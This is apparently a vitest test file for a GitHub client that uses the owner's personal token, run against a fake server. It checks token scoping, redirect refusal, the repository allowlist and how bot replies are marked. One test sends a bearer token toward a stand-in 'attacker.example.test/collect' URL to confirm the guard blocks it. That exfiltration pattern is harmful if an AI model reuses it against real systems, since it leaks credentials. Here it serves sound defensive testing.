// Port lane L11: the GitHub client for a laptop (the owner's personal token) under the GitHub adapters, run over the fake GitHub HTTP server (never the real one). It passes the same client
// conformance suite as Cloud's App client (credential model `owner-token`), the CodeHost contract through the adapter, and the checks that only a personal-token client has: nothing App-only
// reaches the network, the token goes to api.github.com only, the credential's expiry, what a token that cannot push gets, and how Rovara's own replies are told from a person's.
import { randomBytes } from "node:crypto";
import { describe, expect, it, vi } from "vitest";
import { HostRateLimitError, SecretValue, hostRateLimitRetryAt } from "@agentx/contracts";
import { githubCodeHost } from "../../packages/broker/src/plugins/code-host/github/index.js";
import { GITHUB_CODE_HOST_PROVIDER_METHODS, type GitHubCodeHostProvider } from "../../packages/broker/src/plugins/code-host/github/provider.js";
import { PERSONAL_CREDENTIAL_LIFETIME_MS, PERSONAL_REPLY_MARKER, boundToCompany, forwardGuarded, foldRequest, githubTokenClient, githubTokenReach, tokenExpirationOf } from "../../packages/broker/src/plugins/code-host/github/token-client.js";
import { FakeHostModel } from "@agentx/broker/fakes";
import { codeHostChecks, type CodeHostWorld } from "../support/ports/code-host-conformance.js";
import { runContract } from "../support/ports/plugin-contract-kit.js";
import { githubClientChecks, runGitHubClientConformance, RecordingNetwork, TenantBinding, operationsForProbe, type GitHubClientWorld } from "../support/ports/github-client-conformance.js";
import { GITHUB_ORG_SCOPE, GITHUB_OTHER_URL, GITHUB_REPO_URL, GitHubFixtureApi, type GitHubFixtureOptions } from "../support/ports/github-fixture-api.js";

const NOW = Date.parse("2026-10-30T10:00:00.000Z");
const WORKING_BRANCH = (n: number) => `agentx/00000000-0000-4000-8000-${String(n).padStart(12, "0")}`;
/** Built at runtime (never a literal), and far too short to be a real token. A fine-grained token is the kind a worker may be given. */
const PREFIX = (...parts: string[]): string => parts.join("_");
const makeToken = (): string => `${PREFIX("github", "pat")}_fixture${randomBytes(8).toString("hex")}`;
/** The kind the GitHub CLI holds: it reaches every repository its owner can. */
const makeBroadToken = (): string => `${PREFIX("gho")}_fixture${randomBytes(8).toString("hex")}`;

function model(): FakeHostModel {
  return new FakeHostModel({ url: GITHUB_REPO_URL, id: "4242", fullName: "acme/app", webBase: "https://github.com" });
}

interface Built {
  client: GitHubCodeHostProvider;
  api: GitHubFixtureApi;
  net: RecordingNetwork;
  binding: TenantBinding;
  model: FakeHostModel;
  token: string;
  /** Every request as the fake GitHub saw it, with the authorization it carried. */
  seen: Array<{ origin: string; path: string; authorization: string | null }>;
}

function build(options: { registered?: string[]; allowBroad?: boolean; fixture?: GitHubFixtureOptions; binding?: boolean; stripRedirectMode?: boolean; getToken?: () => Promise<SecretValue>; token?: string; wrap?: (inner: typeof fetch) => typeof fetch } = {}): Built {
  const token = options.token ?? makeToken();
  const m = model();
  const api = new GitHubFixtureApi(m, { personalToken: token, ...options.fixture });
  const seen: Built["seen"] = [];
  const recordingApi: typeof fetch = async (input, init) => {
    const url = new URL(typeof input === "string" ? input : input instanceof URL ? input.href : input.url);
    seen.push({ origin: url.origin, path: url.pathname, authorization: new Headers(init?.headers).get("authorization") });
    return api.fetch(input, init);
  };
  const net = new RecordingNetwork(options.wrap === undefined ? recordingApi : options.wrap(recordingApi));
  const binding = new TenantBinding();
  const stripped: typeof fetch = (input, init) => {
    if (init === undefined) return net.fetch(input, init);
    const copy = { ...init };
    delete copy.redirect;
    return net.fetch(input, copy);
  };
  const client = githubTokenClient({
    credentialRef: "github",
    getToken: options.getToken ?? (async () => new SecretValue(token)),
    requireBound: options.binding === false ? async () => undefined : async (orgId, repository) => binding.hook(orgId, 0, repository),
    registeredRepositories: () => options.registered ?? [GITHUB_REPO_URL],
    ...(options.allowBroad === true ? { allowBroadTokenForWorker: true } : {}),
    observeMint: (mint) => net.recordMint(mint),
    fetchImplementation: options.stripRedirectMode === true ? stripped : net.fetch,
    now: () => NOW,
  });
  return { client, api, net, binding, model: m, token, seen };
}

function conformanceWorld(options: Parameters<typeof build>[0] = {}): GitHubClientWorld {
  const built = build(options);
  const world: GitHubClientWorld = {
    client: built.client, net: built.net, binding: built.binding, repositoryUrl: GITHUB_REPO_URL, strangerUrl: GITHUB_OTHER_URL, credentialRef: "github", scope: GITHUB_ORG_SCOPE,
    otherScope: { orgId: "org_bbbbbbbbbbbbbbbbbbbb" }, installationId: 0, repositoryId: 4242,
    credentials: "owner-token", ownerToken: built.token, now: () => NOW,
    async prepare() {
      const m = built.model;
      const headSha = m.commit(WORKING_BRANCH(1), { "src/a.ts": "export const a = 1;\n", "src/big.txt": "x".repeat(4_000) });
      m.setAccount("priya", "write");
      const { cr } = m.reconcile({ sourceBranch: WORKING_BRANCH(1), targetBranch: "main", title: "Add a", draft: true });
      const comment = m.addReviewComment(cr.id, "priya", "Please rename this.", "src/a.ts", 1);
      // The number the client gives the owner (it is not a GitHub installation id); the suite's branch listing pins it.
      world.installationId = (await built.client.installationForRepository("acme", "app"))!.installationId;
      let fresh = 100;
      return {
        number: Number(cr.id), headSha, commentId: comment.id, largeFile: "src/big.txt",
        freshBranch: () => { fresh += 1; const branch = `agentx/00000000-0000-4000-8000-${String(fresh).padStart(12, "0")}`; m.commit(branch, { [`src/${String(fresh)}.ts`]: "export const b = 1;\n" }); return branch; },
      };
    },
  };
  return world;
}

runGitHubClientConformance("the owner-token GitHub client passes the GitHub client conformance suite", conformanceWorld, { describe, it });

describe("the client conformance suite can fail for an owner-token client", () => {
  const find = (prefix: string) => githubClientChecks.find((check) => check.name.startsWith(prefix))!;

  it("catches a client that never asks the tenant binding", async () => {
    await expect(find("tenant: every call").run(conformanceWorld({ binding: false }))).rejects.toThrow();
    await expect(find("tenant: a refused binding").run(conformanceWorld({ binding: false }))).rejects.toThrow();
  });

  it("catches a client whose requests would follow a redirect", async () => {
    await expect(find("network: every request refuses redirects").run(conformanceWorld({ stripRedirectMode: true }))).rejects.toThrow();
    await expect(find("network: a redirect answer is never followed to another host").run(conformanceWorld({ stripRedirectMode: true }))).rejects.toThrow();
  });

  it("catches a client that hands out something other than the owner's token", async () => {
    const world = conformanceWorld();
    world.ownerToken = "another-token";
    await expect(find("credentials: a clone credential").run(world)).rejects.toThrow();
  });
});

function codeHostWorld(): CodeHostWorld {
  const built = build();
  const host = githubCodeHost(built.client, { credentialRef: "github", now: () => NOW });
  return {
    host, model: built.model, repository: { url: GITHUB_REPO_URL }, unregistered: { url: GITHUB_OTHER_URL }, scope: GITHUB_ORG_SCOPE, now: () => NOW, branch: WORKING_BRANCH,
    limitReads: (retryAt) => { built.net.limitEverythingFor((retryAt - NOW) / 1_000); },
  };
}

runContract("GitHub CodeHost adapter over the owner-token client passes the CodeHost contract", codeHostChecks, codeHostWorld);

describe("the owner-token GitHub client", () => {
  it("has every method the adapters need, and only those", () => {
    const { client } = build();
    for (const name of GITHUB_CODE_HOST_PROVIDER_METHODS) expect(typeof (client as unknown as Record<string, unknown>)[name], name).toBe("function");
    // The App client's other public methods (agent tokens, webhook history, installation lists) are not reachable through it.
    const surface = Object.keys(client).sort();
    expect(surface).toEqual([...GITHUB_CODE_HOST_PROVIDER_METHODS, "getPathKindAtCommit", "getCommitChanges", "getCompareChanges", "listPullRequestComments", "postPullRequestComment", "commitFilesToBranch", "findLessonsPullRequest", "deleteLessonsBranch"].sort());
    expect(Object.isFrozen(client)).toBe(true);
    for (const name of ["createAgentInstallationToken", "agentRepositoryReader", "appSlug", "oauthClient", "listWebhookDeliveries", "installation"]) expect(name in client).toBe(false);
  });

  it("answers every App-only request itself: none reaches GitHub, and the App JWT never leaves the process", async () => {
    const built = build();
    const fixture = await (async () => {
      const m = built.model;
      const headSha = m.commit(WORKING_BRANCH(1), { "src/a.ts": "export const a = 1;\n" });
      const { cr } = m.reconcile({ sourceBranch: WORKING_BRANCH(1), targetBranch: "main", title: "Add a" });
      return { headSha, number: Number(cr.id) };
    })();
    const w: GitHubClientWorld = {
      client: built.client, net: built.net, binding: built.binding, repositoryUrl: GITHUB_REPO_URL, strangerUrl: GITHUB_OTHER_URL, credentialRef: "github", scope: GITHUB_ORG_SCOPE,
      otherScope: { orgId: "org_bbbbbbbbbbbbbbbbbbbb" }, installationId: 0, repositoryId: 4242, credentials: "owner-token", ownerToken: built.token, now: () => NOW,
      async prepare() { throw new Error("unused"); },
    };
    for (const operation of operationsForProbe()) {
      try {
        await operation.run(w, { ...fixture, commentId: "1", largeFile: "src/a.ts", freshBranch: () => WORKING_BRANCH(1) }, GITHUB_ORG_SCOPE);
      } catch { /* the suite looks at the network, not at what the fake had to answer */ }
    }
    expect(built.api.appRequests).toEqual([]);
    expect(built.api.tokens).toEqual([]);
    expect(built.seen.length).toBeGreaterThan(0);
    // Every request that carried a credential carried the owner's token (never a JWT) and went to api.github.com.
    for (const request of built.seen) {
      if (request.authorization === null) continue;
      expect(request.authorization).toBe(`Bearer ${built.token}`);
      expect(request.origin).toBe("https://api.github.com");
    }
  });

  it("writes the lessons file with the owner's token only for a registered repository, and on a laptop does not claim a change request is Rovara's own (item C1)", async () => {
    const built = build();
    const host = githubCodeHost(built.client, { credentialRef: "github", now: () => NOW });
    const branch = "rovara/lessons-0123456789ab";
    const input = { repository: { url: GITHUB_REPO_URL }, branch, baseBranch: "main", message: "Lessons", files: [{ path: ".rovara/lessons.md", content: "x\n" }], fromBase: true };
    const written = await host.commitFiles!(input, GITHUB_ORG_SCOPE);
    expect(written.changed).toBe(true);
    expect(built.model.headOf(branch)).toBe(written.revision);
    expect(built.api.appRequests).toEqual([]);
    for (const request of built.seen) if (request.authorization !== null) expect(request.authorization).toBe(`Bearer ${built.token}`);
    // The owner's account made it, and so did the owner by hand: the laptop cannot tell Rovara's from the owner's, so it does not say.
    const { ref } = await host.reconcileChangeRequest({ repository: { url: GITHUB_REPO_URL }, sourceBranch: branch, targetBranch: "main", title: "Lessons" }, GITHUB_ORG_SCOPE);
    expect((await host.getChangeRequest(ref, GITHUB_ORG_SCOPE)).authoredByRovara).toBeUndefined();
    // A repository nobody registered is refused before any request that carries the token.
    const before = built.seen.length;
    await expect(host.commitFiles!({ ...input, repository: { url: GITHUB_OTHER_URL }, branch: "rovara/lessons-aaaaaaaaaaaa" }, GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
    expect(built.seen.slice(before).filter((request) => request.authorization !== null)).toEqual([]);
  });

  it("hands the owner's own token to the worker for clone and for push, with an expiry Rovara chose (inside the hour)", async () => {
    const { client, token } = build();
    const clone = await client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE);
    const push = await client.resolveWithExpiry("github", GITHUB_REPO_URL, "push", GITHUB_ORG_SCOPE);
    expect(clone).toMatchObject({ username: "x-access-token", password: token });
    expect(push).toMatchObject({ username: "x-access-token", password: token });
    expect(Date.parse(clone.expiresAt!)).toBe(NOW + PERSONAL_CREDENTIAL_LIFETIME_MS);
    expect(PERSONAL_CREDENTIAL_LIFETIME_MS).toBeLessThan(3_600_000);
    // A reference the client was not set up with is no credential.
    expect(await client.resolveWithExpiry("another", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).toEqual({});
  });

  it("gives a token that itself expires sooner that earlier time, and refuses one that has expired", async () => {
    const soon = new Date(NOW + 10 * 60_000).toISOString().replace("T", " ").replace(/\.\d+Z$/u, " UTC");
    const early = build({ fixture: { personalTokenExpiration: soon } });
    const credential = await early.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE);
    expect(Date.parse(credential.expiresAt!)).toBe(NOW + 10 * 60_000);
    const past = new Date(NOW - 60_000).toISOString().replace("T", " ").replace(/\.\d+Z$/u, " UTC");
    const expired = build({ fixture: { personalTokenExpiration: past } });
    await expect(expired.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "RUNTIME_UNAVAILABLE" });
  });

  it("reads GitHub's token expiration header only in its documented form", () => {
    const answer = (value: string) => new Response("{}", { headers: { "github-authentication-token-expiration": value } });
    expect(tokenExpirationOf(answer("2026-12-01 10:00:00 UTC"))).toBe(Date.parse("2026-12-01T10:00:00Z"));
    expect(tokenExpirationOf(answer("tomorrow"))).toBeUndefined();
    expect(tokenExpirationOf(new Response("{}"))).toBeUndefined();
  });

  it("refuses a push credential when the token cannot push, and still hands out a clone credential", async () => {
    const readOnly = build({
      wrap: (inner) => async (input, init) => {
        const answer = await inner(input, init);
        if (new URL(typeof input === "string" ? input : input instanceof URL ? input.href : input.url).pathname !== "/repos/acme/app") return answer;
        const body = (await answer.json()) as Record<string, unknown>;
        return Response.json({ ...body, permissions: { push: false, pull: true } });
      },
    });
    await expect(readOnly.client.resolveWithExpiry("github", GITHUB_REPO_URL, "push", GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "RUNTIME_UNAVAILABLE" });
    expect(await readOnly.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).toMatchObject({ password: readOnly.token });
  });

  it("says a repository the token cannot see is unreachable in words about the token, not an App", async () => {
    const { client } = build({ registered: [GITHUB_REPO_URL, GITHUB_OTHER_URL] });
    const error = await client.resolveWithExpiry("github", GITHUB_OTHER_URL, "clone", GITHUB_ORG_SCOPE).catch((caught: unknown) => caught as Error);
    expect(error).toMatchObject({ code: "CONFIG_INVALID" });
    expect((error as Error).message).toContain("the GitHub token cannot access acme/other");
    expect((error as Error).message).not.toMatch(/App/u);
    expect(await client.getRepositoryIdentity(GITHUB_OTHER_URL, GITHUB_ORG_SCOPE).catch(() => "refused")).toBe("refused");
  });

  it("says a rejected token in plain words and names no token", async () => {
    const built = build({ getToken: async () => new SecretValue("a-token-github-does-not-know") });
    const error = await built.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE).catch((caught: unknown) => caught as Error);
    expect(error).toMatchObject({ code: "RUNTIME_UNAVAILABLE" });
    expect((error as Error).message).toContain("GitHub rejected the token");
    expect((error as Error).message).not.toContain("a-token-github-does-not-know");
  });

  it("refuses a token that is not one printable word before it reaches a header, and a sign-in that is missing", async () => {
    for (const bad of ["with space", "line\nbreak", ""]) {
      const built = build({ getToken: async () => new SecretValue(bad) });
      await expect(built.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "CONFIG_INVALID" });
      expect(built.seen).toEqual([]);
    }
    const missing = build({ getToken: async () => { throw new Error("no GitHub sign-in was found; run `gh auth login`, or set GH_TOKEN"); } });
    await expect(missing.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).rejects.toThrow(/no GitHub sign-in was found/u);
  });

  it("holds every call to the one company", async () => {
    const built = build();
    const bound = githubTokenClient({ credentialRef: "github", getToken: async () => new SecretValue(built.token), requireBound: boundToCompany("org_aaaaaaaaaaaaaaaaaaaa"), registeredRepositories: () => [GITHUB_REPO_URL], fetchImplementation: built.net.fetch, now: () => NOW });
    expect(await bound.getRepositoryIdentity(GITHUB_REPO_URL, GITHUB_ORG_SCOPE)).toMatchObject({ repositoryId: 4242 });
    await expect(bound.getRepositoryIdentity(GITHUB_REPO_URL, { orgId: "org_bbbbbbbbbbbbbbbbbbbb" })).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
  });

  it("maps GitHub's rate limit on the first look at a repository to the neutral error", async () => {
    const built = build();
    built.net.limitEverythingFor(45);
    const error = await built.client.getRepositoryIdentity(GITHUB_REPO_URL, GITHUB_ORG_SCOPE).catch((caught: unknown) => caught);
    expect(error).toBeInstanceOf(HostRateLimitError);
    expect(hostRateLimitRetryAt(error)).toBe(NOW + 45_000);
  });

  it("reads the owner's login once per token and reuses it", async () => {
    const built = build();
    const m = built.model;
    m.commit(WORKING_BRANCH(1), { "src/a.ts": "x\n" });
    const { cr } = m.reconcile({ sourceBranch: WORKING_BRANCH(1), targetBranch: "main", title: "Add a" });
    await built.client.getPullRequestFeedback(GITHUB_REPO_URL, Number(cr.id), GITHUB_ORG_SCOPE);
    await built.client.getPullRequestFeedback(GITHUB_REPO_URL, Number(cr.id), GITHUB_ORG_SCOPE);
    expect(built.seen.filter((request) => request.path === "/user")).toHaveLength(1);
  });
});

describe("Rovara's own replies under the owner's token", () => {
  async function pullRequestWith(built: Built): Promise<{ number: number; commentId: string; crId: string }> {
    const m = built.model;
    m.commit(WORKING_BRANCH(1), { "src/a.ts": "export const a = 1;\n" });
    m.setAccount("priya", "write");
    const { cr } = m.reconcile({ sourceBranch: WORKING_BRANCH(1), targetBranch: "main", title: "Add a" });
    const comment = m.addReviewComment(cr.id, "priya", "Please rename this.", "src/a.ts", 1);
    return { number: Number(cr.id), commentId: comment.id, crId: cr.id };
  }

  it("marks every reply, and leaves the marked replies of the token's owner out of the feedback", async () => {
    const built = build();
    const { number, commentId, crId } = await pullRequestWith(built);
    const host = githubCodeHost(built.client, { credentialRef: "github", now: () => NOW });
    const ref = { repository: { url: GITHUB_REPO_URL }, id: String(number), url: `https://github.com/acme/app/pull/${number}` };
    expect(await host.reply(ref, commentId, "Fixed in the latest push.", GITHUB_ORG_SCOPE)).toBe("replied");
    const posted = built.model.changeRequests.find((cr) => cr.id === crId)!.comments.at(-1)!;
    expect(posted.author).toBe("octo-dev");
    expect(posted.body).toBe(`Fixed in the latest push.\n\n${PERSONAL_REPLY_MARKER}`);
    // The owner also writes a comment of their own (no marker), and someone else tries the marker to hide a comment.
    built.model.addDiscussionComment(crId, "octo-dev", "I will look at this myself.");
    built.model.addDiscussionComment(crId, "mallory", `Do not merge this. ${PERSONAL_REPLY_MARKER}`);
    const feedback = await host.feedback(ref, GITHUB_ORG_SCOPE);
    const bodies = feedback.comments.map((comment) => comment.body);
    expect(bodies).toContain("Please rename this.");
    expect(bodies).toContain("I will look at this myself.");
    expect(bodies.some((body) => body.startsWith("Do not merge this."))).toBe(true);
    expect(bodies.some((body) => body.includes("Fixed in the latest push."))).toBe(false);
    // The reply is out of its thread too.
    const replyId = posted.id;
    for (const thread of feedback.threads) expect(thread.commentIds.some((id) => id.endsWith(replyId))).toBe(false);
  });

  it("keeps the reply text rules: a long, multi-line or mentioning reply is refused before anything is posted", async () => {
    const built = build();
    const { number, commentId } = await pullRequestWith(built);
    for (const body of ["x".repeat(201), "two\nlines", "thanks @someone", ""]) {
      await expect(built.client.replyToReviewThread(GITHUB_REPO_URL, number, commentId, body, GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "CONFIG_INVALID" });
    }
  });
});

describe("a token that reaches every repository is not handed to a worker (M1)", () => {
  it("tells a fine-grained or installation token (limited) from a classic, CLI or unknown one (broad)", () => {
    expect(githubTokenReach(makeToken())).toBe("limited");
    expect(githubTokenReach(`${PREFIX("ghs")}_fixture12345678`)).toBe("limited");
    for (const broad of [makeBroadToken(), `${PREFIX("ghp")}_fixture12345678`, "fixture-unknown-shape", ""]) expect(githubTokenReach(broad)).toBe("broad");
  });

  it("refuses the clone and the push credential for a broad token, and still serves every broker-side read with it", async () => {
    const token = makeBroadToken();
    const built = build({ token });
    for (const access of ["clone", "push"] as const) {
      await expect(built.client.resolveWithExpiry("github", GITHUB_REPO_URL, access, GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "FORBIDDEN" });
    }
    const error = await built.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE).catch((caught: unknown) => caught as Error);
    expect((error as Error).message).toContain("allowBroadTokenForWorker");
    expect((error as Error).message).not.toContain(token);
    // The broker's own reads are unaffected: only a copy given to a worker is the risk.
    expect(await built.client.getRepositoryIdentity(GITHUB_REPO_URL, GITHUB_ORG_SCOPE)).toMatchObject({ repositoryId: 4242 });
  });

  it("hands a broad token over only when the owner said so, and a fine-grained token always", async () => {
    const token = makeBroadToken();
    const allowed = build({ token, allowBroad: true });
    expect(await allowed.client.resolveWithExpiry("github", GITHUB_REPO_URL, "push", GITHUB_ORG_SCOPE)).toMatchObject({ password: token });
    const limited = build();
    expect(await limited.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).toMatchObject({ password: limited.token });
  });
});

describe("only registered repositories are used (M2)", () => {
  const OTHER = "https://github.com/acme/other";

  it("refuses a repository the token can see but the company did not register, before any request that carries the token", async () => {
    const built = build({ registered: [GITHUB_REPO_URL] });
    built.model.commit(WORKING_BRANCH(1), { "a.txt": "a\n" });
    for (const run of [
      () => built.client.resolveWithExpiry("github", OTHER, "clone", GITHUB_ORG_SCOPE),
      () => built.client.getFileAtCommit(OTHER, "a.txt", "a".repeat(40), GITHUB_ORG_SCOPE),
      () => built.client.getBranchHead(OTHER, WORKING_BRANCH(1), GITHUB_ORG_SCOPE),
      () => built.client.reconcilePullRequest({ repositoryUrl: OTHER, headBranch: WORKING_BRANCH(1), baseBranch: "main", title: "t" }, GITHUB_ORG_SCOPE),
      () => built.client.installationForRepository("acme", "other"),
    ]) await expect(run()).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
    expect(built.seen).toEqual([]);
  });

  it("lets the registration-time reads (is it there, who is it) look at a repository not yet registered, and nothing else", async () => {
    const built = build({ registered: [] });
    expect(await built.client.getRepositoryIdentity(GITHUB_REPO_URL, GITHUB_ORG_SCOPE)).toMatchObject({ repositoryId: 4242 });
    await expect(built.client.checkRepository({ credentialRef: "github", url: GITHUB_REPO_URL }, GITHUB_ORG_SCOPE)).resolves.toBeUndefined();
    await expect(built.client.getFileAtCommit(GITHUB_REPO_URL, "a.txt", "a".repeat(40), GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
    await expect(built.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
  });

  it("reads the list on every use, so a project registered later is usable at once and a removed one stops", async () => {
    let list: string[] = [];
    const built = build();
    const client = githubTokenClient({ credentialRef: "github", getToken: async () => new SecretValue(built.token), requireBound: async () => undefined, registeredRepositories: () => list, fetchImplementation: built.net.fetch, now: () => NOW });
    await expect(client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
    list = ["https://github.com/ACME/App"];
    expect(await client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).toMatchObject({ password: built.token });
    list = [];
    await expect(client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
  });
});

describe("the owner's login must be known to read feedback (M3)", () => {
  it("fails the feedback read while the login is unknown, never treating Rovara's own replies as the owner's feedback, and asks again afterwards", async () => {
    let failUser = true;
    const built = build({ wrap: (inner) => async (input, init) => (failUser && new URL(typeof input === "string" ? input : input instanceof URL ? input.href : input.url).pathname === "/user" ? new Response("{}", { status: 502 }) : inner(input, init)) });
    const m = built.model;
    m.commit(WORKING_BRANCH(1), { "src/a.ts": "x\n" });
    m.setAccount("priya", "write");
    const { cr } = m.reconcile({ sourceBranch: WORKING_BRANCH(1), targetBranch: "main", title: "Add a" });
    const comment = m.addReviewComment(cr.id, "priya", "Please rename this.", "src/a.ts", 1);
    const host = githubCodeHost(built.client, { credentialRef: "github", now: () => NOW });
    const ref = { repository: { url: GITHUB_REPO_URL }, id: cr.id, url: `https://github.com/acme/app/pull/${cr.id}` };
    await host.reply(ref, comment.id, "Fixed in the latest push.", GITHUB_ORG_SCOPE);
    await expect(host.feedback(ref, GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "RUNTIME_UNAVAILABLE" });
    await expect(host.feedback(ref, GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "RUNTIME_UNAVAILABLE" });
    // The failed look was not remembered: the next read asks again and the reply is left out.
    failUser = false;
    const feedback = await host.feedback(ref, GITHUB_ORG_SCOPE);
    expect(feedback.comments.map((entry) => entry.body)).toEqual(["Please rename this."]);
  });
});

describe("Rovara's exact reply shape is what is left out (L1)", () => {
  it("keeps an owner comment that merely contains the marker, and drops only the one-line reply with the marker last", async () => {
    const built = build();
    const m = built.model;
    m.commit(WORKING_BRANCH(1), { "src/a.ts": "x\n" });
    const { cr } = m.reconcile({ sourceBranch: WORKING_BRANCH(1), targetBranch: "main", title: "Add a" });
    const quoted = `I saw your reply "Fixed in the latest push.\n\n${PERSONAL_REPLY_MARKER}" and it is not fixed.`;
    m.addDiscussionComment(cr.id, "octo-dev", quoted);
    m.addDiscussionComment(cr.id, "octo-dev", `Fixed in the latest push.\n\n${PERSONAL_REPLY_MARKER}`);
    m.addDiscussionComment(cr.id, "octo-dev", `Two\nlines\n\n${PERSONAL_REPLY_MARKER}`);
    m.addDiscussionComment(cr.id, "octo-dev", `Fixed @someone\n\n${PERSONAL_REPLY_MARKER}`);
    const feedback = await built.client.getPullRequestFeedback(GITHUB_REPO_URL, Number(cr.id), GITHUB_ORG_SCOPE);
    expect(feedback.comments.map((entry) => entry.body)).toEqual([quoted, `Two\nlines\n\n${PERSONAL_REPLY_MARKER}`, `Fixed @someone\n\n${PERSONAL_REPLY_MARKER}`]);
  });
});

describe("the owner's token never leaves in a Request, and never follows a redirect (L2)", () => {
  it("folds a Request's own headers, body and redirect mode into what is checked", async () => {
    const folded = await foldRequest(new Request("https://api.github.com/repos/acme/app", { method: "POST", headers: { authorization: "Bearer x" }, body: "{}", redirect: "follow" }));
    expect(folded.address).toBe("https://api.github.com/repos/acme/app");
    expect(new Headers(folded.init.headers).get("authorization")).toBe("Bearer x");
    expect(folded.init.body).toBe("{}");
    expect(folded.init.redirect).toBe("follow");
  });

  it("refuses a Request that carries the token to another address, without sending it", async () => {
    const inner = vi.fn<typeof fetch>(async () => new Response("{}"));
    const request = new Request("https://attacker.example.test/collect", { headers: { authorization: "Bearer x" } });
    await expect(forwardGuarded(inner, await foldRequest(request))).rejects.toMatchObject({ code: "RUNTIME_UNAVAILABLE" });
    expect(inner).not.toHaveBeenCalled();
  });

  it("forces redirect refusal on a request that carries the token, keeps `manual` where it was asked for, and leaves a tokenless request alone", async () => {
    const inner = vi.fn<typeof fetch>(async () => new Response("{}"));
    const api = "https://api.github.com/repos/acme/app";
    await forwardGuarded(inner, await foldRequest(new Request(api, { headers: { authorization: "Bearer x" }, redirect: "follow" })));
    await forwardGuarded(inner, await foldRequest(api, { headers: { authorization: "Bearer x" } }));
    await forwardGuarded(inner, await foldRequest(api, { headers: { authorization: "Bearer x" }, redirect: "manual" }));
    await forwardGuarded(inner, await foldRequest("https://pipelines.example.test/log", { headers: { accept: "text/plain" } }));
    expect(inner.mock.calls.map(([, init]) => init?.redirect)).toEqual(["error", "error", "manual", undefined]);
  });
});

describe("a refused binding sends nothing, even on a cold client (L3)", () => {
  it("makes no request at all when the organization is refused first", async () => {
    const built = build();
    built.binding.refuse(GITHUB_ORG_SCOPE.orgId);
    await expect(built.client.getRepositoryIdentity(GITHUB_REPO_URL, GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
    await expect(built.client.resolveWithExpiry("github", GITHUB_REPO_URL, "clone", GITHUB_ORG_SCOPE)).rejects.toMatchObject({ code: "GITHUB_NOT_CONNECTED" });
    expect(built.seen).toEqual([]);
  });

  it("reports each token request it answers, so the suite can pin its permission set and its one repository", async () => {
    const built = build();
    await built.client.resolveWithExpiry("github", GITHUB_REPO_URL, "push", GITHUB_ORG_SCOPE);
    expect(built.net.tokenRequests()).toEqual([{ permissions: { contents: "write" }, repositories: ["app"] }]);
  });
});

describe("the token handed out is the one that passed the check (L4)", () => {
  it("does not re-read the sign-in between the check and the credential", async () => {
    const [first, second, third] = [makeToken(), makeToken(), makeToken()] as [string, string, string];
    const reads: string[] = [first, second, third];
    // The fake knows only `first`; the others are the same account signed in again, so it accepts them by treating them as `first`.
    const built = build({
      token: first, getToken: async () => new SecretValue(reads.shift() ?? third),
      wrap: (inner) => async (input, init) => {
        const headers = new Headers(init?.headers);
        if ([second, third].some((token) => headers.get("authorization") === `Bearer ${token}`)) headers.set("authorization", `Bearer ${first}`);
        return inner(input, { ...init, headers });
      },
    });
    const credential = await built.client.resolveWithExpiry("github", GITHUB_REPO_URL, "push", GITHUB_ORG_SCOPE);
    // Two reads were made: the lookup's (first) and the check's (second). The credential is the second, not a third read nobody checked.
    expect(credential.password).toBe(second);
  });
});
